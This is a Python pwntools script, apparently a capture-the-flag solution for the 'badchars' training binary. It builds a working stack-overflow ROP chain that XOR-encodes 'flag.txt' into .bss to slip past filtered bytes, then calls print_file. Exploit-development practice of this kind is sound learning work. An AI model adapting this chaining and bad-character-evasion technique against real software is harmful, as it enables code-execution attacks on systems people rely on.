#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template badchars
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'badchars')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# RUNPATH:    b'.'
# Stripped:   No

def xor_bytes(bstr1, bstr2):
    return bytes( a ^ b for a,b in zip(bstr1,bstr2) )

RIP_DIST = 40

BSS_SLOT = 0x601000 + 0x100

WRITE_R13_R12       = 0x0000000000400634
POP_R12_R13_R14_R15 = 0x000000000040069c
XOR_R15_R14B        = 0x0000000000400628
POP_R15             = 0x00000000004006a2
POP_RDI             = 0x00000000004006a3
PRINT_FILE          = 0x400510


FILE = b"flag.txt"
KEY  = b'\0\0\x01\x01\x01\0\x01\0'


io = start()

pause()

io.sendline(b'b' * RIP_DIST +
            flat(POP_R12_R13_R14_R15) + flat(xor_bytes(FILE, KEY)) + flat(BSS_SLOT) + flat(1) +  flat(BSS_SLOT + 2) +
            flat(WRITE_R13_R12) +
            flat(XOR_R15_R14B) +
            flat(POP_R15) + flat(BSS_SLOT + 3) +
            flat(XOR_R15_R14B) +
            flat(POP_R15) + flat(BSS_SLOT + 4) +
            flat(XOR_R15_R14B) +
            flat(POP_R15) + flat(BSS_SLOT + 6) +
            flat(XOR_R15_R14B) +
            flat(POP_RDI) + flat(BSS_SLOT) + 
            flat(PRINT_FILE)
            )

io.interactive()

